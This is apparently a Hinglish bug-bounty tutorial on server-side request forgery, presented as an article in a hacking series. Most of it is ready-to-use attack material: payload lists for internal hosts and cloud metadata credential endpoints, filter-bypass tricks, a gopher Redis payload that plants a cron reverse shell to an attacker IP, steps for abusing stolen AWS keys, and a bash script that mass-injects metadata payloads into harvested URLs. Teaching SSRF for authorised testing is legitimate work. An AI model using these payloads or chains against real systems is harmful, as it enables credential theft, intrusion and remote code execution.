# :globe_with_meridians: SSRF Server-Side Request Forgery: Server Ko Apna Agent Banao, Internal Network Explore Karo! (Hinglish Mein)

---

# SSRF Server-Side Request Forgery: Server Ko Apna Agent Banao, Internal Network Explore Karo! (Hinglish Mein)

Series: Bug Bounty Zero se Hero 🦸 | Article #17
*By HackerMD | 19 min read*

## Aaj Kya Seekhenge?

- SSRF kya hai bilkul basics se

- Basic vs Blind SSRF dono types

- Cloud metadata attacks AWS, GCP, Azure

- SSRF bypass techniques elite level

- Internal network exploration

- SSRF to RCE chain

- Complete bug bounty workflow

>

Kyun zaroori hai? SSRF aaj ke cloud-heavy world mein sabse critical vulnerability ban gayi hai! AWS EC2 pe ek SSRF = IAM credentials = Poora AWS account compromise! Companies ne $10,000 se $50,000+ bounty diya hai sirf SSRF ke liye!

## SSRF Kya Hai? Simple Analogy

Socho ek Delivery Boy hai:

```
Normal:
Tum: "Yeh parcel 123 Main Street pe deliver karo"
Delivery Boy: 123 Main Street jaata hai ✅

SSRF:
Tum: "Yeh parcel localhost/admin pe deliver karo"
Delivery Boy: "Okay!" — Internal server pe jaata hai! 😱

Problem:
→ Delivery boy (Server) trusted hai
→ Woh internal locations pe bhi ja sakta hai
→ Jo tum directly nahi ja sakte!
```

Website mein:

```
Normal:
Server: "Kaunsa URL fetch karoon?"
User: "https://example.com/image.jpg"
Server: Fetch karta hai ✅

SSRF:
Server: "Kaunsa URL fetch karoon?"
Attacker: "http://169.254.169.254/latest/meta-data/"
Server: AWS Metadata fetch karta hai! 🔴
Result: AWS credentials exposed!
```

## SSRF Ke Types

## Type 1: Basic SSRF Response Direct Milta Hai

```
Server fetch karta hai → Response directly tumhe milta hai!

Test:
?url=http://YOUR_SERVER/test
→ Tumhare server pe request aati hai = SSRF confirmed!

Internal access:
?url=http://localhost/admin
?url=http://127.0.0.1/phpmyadmin
?url=http://internal-api.company.com/secret
→ Response seedha tumhe milta hai!
```

## Type 2: Blind SSRF Response Nahi Milta

```
Server fetch karta hai — lekin response nahi dikhata!
Lekin:
→ Tumhare server pe callback aata hai!
→ DNS lookup hota hai!
→ Time delay se confirm hota hai!

Test karo Interactsh se:
?url=https://YOUR_INTERACTSH_URL.oast.pro
→ Callback aaya? = Blind SSRF confirmed!
```

## PART 2: Kahan Dhundhen SSRF?

```
🖼️ Image URL parameters:
?image=https://...
?avatar=https://...
?thumbnail=https://...

🔗 URL fetch/import features:
?url=https://...
?link=https://...
?src=https://...
?fetch=https://...
?load=https://...

📄 Document/file import:
Import from URL feature
PDF generation from URL
Screenshot service

🔌 Webhooks:
Webhook URL setup
Callback URL fields
Notification endpoints

📡 API integrations:
?endpoint=https://...
?api_url=https://...
?callback=https://...

🗺️ Proxy/redirect features:
/proxy?url=https://...
/redirect?to=https://...

📧 Email/HTML to PDF:
HTML content → PDF mein URLs
Email templates

🔄 XML/JSON with URLs:
{"icon_url": "https://..."}
<url>https://...</url>
```

## PART 3: SSRF Payloads Sabhi Try Karo

## Basic Localhost Payloads:

```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://0
http://127.1
http://127.0.1
http://localtest.me
http://spoofed.burpcollaborator.net
```

## Internal Network Exploration:

```
# Common internal IPs
http://192.168.0.1
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
http://172.31.255.255

# Internal services
http://127.0.0.1:22 → SSH
http://127.0.0.1:3306 → MySQL
http://127.0.0.1:6379 → Redis
http://127.0.0.1:27017 → MongoDB
http://127.0.0.1:9200 → Elasticsearch
http://127.0.0.1:8080 → Internal web
http://127.0.0.1:8500 → Consul
http://127.0.0.1:2375 → Docker API!
http://127.0.0.1:5984 → CouchDB
```

## Cloud Metadata HIGHEST VALUE!

## AWS EC2 Metadata:

```
# Classic endpoint (v1 — no auth needed!)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response mein milega:
{
"Code": "Success",
"AccessKeyId": "ASIA...",
"SecretAccessKey": "abc123...",
"Token": "FQoGZXIvYXdzE...",
"Expiration": "2026-04-18T..."
}

# Yeh credentials use karke:
aws s3 ls --no-verify-ssl
aws iam list-users
aws ec2 describe-instances
→ Poora AWS account access! 💰
```

## GCP Metadata:

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Header zaroori hai:
Metadata-Flavor: Google

Token milega → GCP APIs access!
```

## Azure Metadata:

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

Header:
Metadata: true
```

## DigitalOcean Metadata:

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/account-id
http://169.254.169.254/metadata/v1/user-data
```

## PART 4: SSRF Bypass Techniques Elite Level

## Bypass 1: IP Encoding Tricks

```
# Decimal notation
http://2130706433/ → 127.0.0.1
http://3232235521/ → 192.168.0.1

# Octal notation
http://0177.0.0.1/ → 127.0.0.1
http://0177.00.00.01/

# Hex notation
http://0x7f000001/ → 127.0.0.1
http://0x7f.0x0.0x0.0x1/

# Mixed notation
http://127.0x0.0.1/
http://0x7f.0.0.1/
http://127.000.000.001/

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

## Bypass 2: DNS Rebinding

```
# Apna domain setup karo:
# evil.com → Pehle public IP dikhao → Filter pass karo
# → Phir 127.0.0.1 pe redirect karo

# Tools:
# singularity.me (DNS rebinding tool)
# rbndr.us (free DNS rebinding)

Use:
http://7f000001.1time.rbndr.us/
→ Pehle 1.0.0.127 → Phir 127.0.0.1!
```

## Bypass 3: URL Redirects

```
# Agar server HTTPS follow karta hai
# Apne server pe redirect setup karo:

# evil.com/redirect → 301 → http://127.0.0.1/admin

?url=https://evil.com/redirect
→ Server follow karta hai → Internal access!
```

## Bypass 4: Protocol Smuggling

```
# Different protocols try karo:
file:///etc/passwd → Local file read!
dict://127.0.0.1:6379/ → Redis attack!
gopher://127.0.0.1:6379/ → Redis RCE possible!
ftp://127.0.0.1:21/
ldap://127.0.0.1:389/
sftp://127.0.0.1:22/

# Gopher protocol — Redis RCE!
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

## Bypass 5: URL Parsing Confusion

```
# @ character trick:
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/

# Fragment tricks:
http://127.0.0.1#evil.com
http://evil.com#@127.0.0.1

# Subpath tricks:
http://evil.com/127.0.0.1
http://localhost.evil.com/

# Whitespace tricks:
http://127.0.0.1 .evil.com
http://127.0.0.1%09evil.com
http://127.0.0.1%20evil.com
```

## Bypass 6: Domain Confusion

```
# Domains that resolve to 127.0.0.1:
localtest.me
127.0.0.1.nip.io
lvh.me
vcap.me
0.0.0.0.nip.io
spoofed.burpcollaborator.net
```

## PART 5: SSRF to RCE Maximum Impact!

## Chain 1: SSRF → Redis → RCE

```
# Agar Redis internally chal raha hai (port 6379)
# Gopher protocol se commands bhejo:

# Redis pe cron job likho:
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2459%0D%0A%0A%0A%2A%2F1+%2A+%2A+%2A+%2A+bash+-i+%3E%26+%2Fdev%2Ftcp%2FYOUR_IP%2F4444+0%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Netcat listener:
nc -lvnp 4444
→ Reverse shell! RCE! 🔴
```

## Chain 2: SSRF → AWS → Full Compromise

```
Step 1: SSRF dhundho
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step 2: Role name nikalo
Response: "EC2_PROD_ROLE"

Step 3: Credentials fetch karo
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2_PROD_ROLE

Step 4: AWS CLI configure karo
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=abc...
export AWS_SESSION_TOKEN=FQo...

Step 5: Company ka poora AWS explore karo
aws s3 ls → All S3 buckets!
aws iam list-users → All IAM users!
aws secretsmanager list-secrets → All secrets!
aws rds describe-db-instances → Databases!

→ Critical! $10,000-$50,000 bounty range! 💰
```

## Chain 3: SSRF → Internal Admin → Account Takeover

```
Step 1: Internal admin panel dhundho
?url=http://127.0.0.1:8080/admin

Step 2: Admin endpoints explore karo
?url=http://127.0.0.1:8080/admin/users
?url=http://127.0.0.1:8080/admin/reset-password

Step 3: Actions trigger karo
?url=http://127.0.0.1:8080/admin/users/1/make-admin?user_id=ATTACKER_ID

→ Privilege escalation → Admin access!
```

## PART 6: Automated SSRF Testing

## Tool 1: SSRFmap

```
# Install karo
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic use
python3 ssrfmap.py \
-r request.txt \
-p url \
-m readfiles

# AWS metadata check
python3 ssrfmap.py \
-r request.txt \
-p url \
-m aws

# All modules run karo
python3 ssrfmap.py \
-r request.txt \
-p url \
-m all
```

## Tool 2: Interactsh Blind SSRF Detection

```
# Install karo
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start karo
interactsh-client

# Tumhara URL milega:
# cxxxxxx.oast.pro

# Yeh URL parameters mein inject karo:
?url=https://cxxxxxx.oast.pro
?webhook=https://cxxxxxx.oast.pro
?callback=https://cxxxxxx.oast.pro

# Interactsh console mein dekho:
# HTTP/DNS callbacks = Blind SSRF confirmed!
```

## Tool 3: Nuclei SSRF Templates

```
# Nuclei SSRF templates
nuclei -l targets.txt \
-t ~/nuclei-templates/vulnerabilities/generic/ssrf/ \
-t ~/nuclei-templates/misconfiguration/ \
-tags ssrf \
-o ssrf_found.txt

# Cloud metadata specific
nuclei -l targets.txt \
-tags aws-metadata,gcp-metadata \
-o cloud_ssrf.txt
```

## PART 7: Complete Elite SSRF Workflow

```
#!/bin/bash
# ssrf_hunt.sh

TARGET=$1
DIR="ssrf_${TARGET}"
mkdir -p $DIR

echo "🌐 SSRF Hunt: $TARGET"
echo "═══════════════════════"

# Step 1: URL parameters dhundho
echo "🔍 Finding URL parameters..."
gau $TARGET | grep -iE \
"url=|link=|src=|href=|fetch=|load=|
image=|img=|avatar=|webhook=|callback=|
redirect=|next=|dest=|uri=|path=|
endpoint=|api_url=|return=" | \
uro > $DIR/url_params.txt
echo "✅ URL Params: $(wc -l < $DIR/url_params.txt)"

# Step 2: Interactsh setup
echo "📡 Setup Interactsh first!"
echo "Run: interactsh-client"
echo "Copy your URL and set COLLAB_URL below"
COLLAB_URL="YOUR_INTERACTSH_URL.oast.pro"

# Step 3: Test payloads inject karo
echo "💉 Injecting SSRF payloads..."
while read url; do
# Interactsh callback
SSRF_URL=$(echo $url | \
sed "s/=http[^&]*/=https:\/\/$COLLAB_URL/g")
curl -s "$SSRF_URL" -o /dev/null &

# AWS metadata
AWS_URL=$(echo $url | \
sed 's/=http[^&]*/=http:\/\/169.254.169.254\/latest\/meta-data\//g')
response=$(curl -s "$AWS_URL" --max-time 5)
if echo "$response" | grep -q "iam\|instance-id\|ami-id"; then
echo "🔴 AWS SSRF FOUND: $url" >> $DIR/ssrf_found.txt
echo "$response" >> $DIR/aws_response.txt
fi
done < $DIR/url_params.txt

# Step 4: Nuclei scan
nuclei -l $DIR/url_params.txt \
-tags ssrf \
-o $DIR/nuclei_ssrf.txt 2>/dev/null

echo "═══════════════════════"
echo "📊 Results:"
echo "URL Params : $(wc -l < $DIR/url_params.txt)"
echo "SSRF Found : $(cat $DIR/ssrf_found.txt 2>/dev/null | wc -l)"
echo "Results in : $DIR/"
```

## SSRF Cheat Sheet Quick Reference

```
# ─── DETECTION ───────────────────────────
?url=https://YOUR_SERVER/ → Basic test
?url=https://INTERACTSH/ → Blind SSRF

# ─── LOCALHOST ────────────────────────────
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://2130706433 → 127.0.0.1 decimal

# ─── CLOUD METADATA ──────────────────────
http://169.254.169.254/latest/meta-data/ → AWS
http://metadata.google.internal/ → GCP
http://169.254.169.254/metadata/instance → Azure

# ─── PROTOCOLS ───────────────────────────
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/
ftp://127.0.0.1/

# ─── BYPASS ──────────────────────────────
http://2130706433/
http://0177.0.0.1/
http://0x7f000001/
http://[::ffff:127.0.0.1]/
http://localtest.me/
http://evil.com@127.0.0.1/

# ─── TOOLS ────────────────────────────────
interactsh-client → Blind SSRF
ssrfmap → Automated exploitation
nuclei -tags ssrf → Template scanning
```

## Aaj Ka Homework

```
# 1. Interactsh setup karo:
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# URL note karo

# 2. Practice target:
# http://www.ssrf.training/ (legal practice)
# Ya apna local vulnerable lab:
docker run -p 8080:8080 securitytraining/ssrf-lab

# 3. Test karo:
curl "http://localhost:8080/?url=https://YOUR_INTERACTSH.oast.pro"
# Callback aaya? SSRF confirmed!

# 4. AWS metadata simulate karo:
curl "http://localhost:8080/?url=http://169.254.169.254/latest/meta-data/"

# 5. Comment mein batao:
# Kaunsa bypass technique sabse interesting laga?
```

## Quick Revision

```
🌐 SSRF = Server ko apni taraf se request bhejwao
🔵 Basic = Response seedha milta hai
🟡 Blind = Callback se confirm — response nahi
☁️ Cloud = AWS/GCP/Azure metadata = Keys!
🛡️ Bypass = IP encoding, DNS rebinding,
Protocol smuggling, URL confusion
💥 Chains = SSRF → Redis → RCE
SSRF → AWS creds → Full compromise
🤖 Tools = Interactsh, SSRFmap, Nuclei
💰 Bounty Range = $500 (basic) to $50,000+ (AWS keys)
```

## Meri Baat…

Ek private program pe maine ek image upload feature dekha:

```
POST /api/profile/avatar
{"image_url": "https://example.com/photo.jpg"}
```

Maine socha URL fetch karta hai server!

## Get Hacker MD’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Test kiya:

```
{"image_url": "https://MY_INTERACTSH.oast.pro"}
```

Interactsh pe callback aaya! Blind SSRF confirmed!

Ab AWS metadata:

```
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-ec2-role"}
```

Response:

```
{
"AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
"SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
"Token": "AQoDYXdzEJr...",
"Expiration": "2026-04-18T06:20:00Z"
}
```

AWS production credentials!

```
aws s3 ls # 47 S3 buckets!
aws secretsmanager list-secrets # Database passwords!
```

Bounty: $12,500 Critical! 🎉

Lesson: Image URL, webhook URL, callback URL koi bhi URL parameter SSRF ka door ho sakta hai hamesha test karo!

Agle article mein CORS Misconfiguration Cross-Origin Resource Sharing ke wrong settings se kaise user data steal hota hai! Simple lekin powerful! 🔥

---
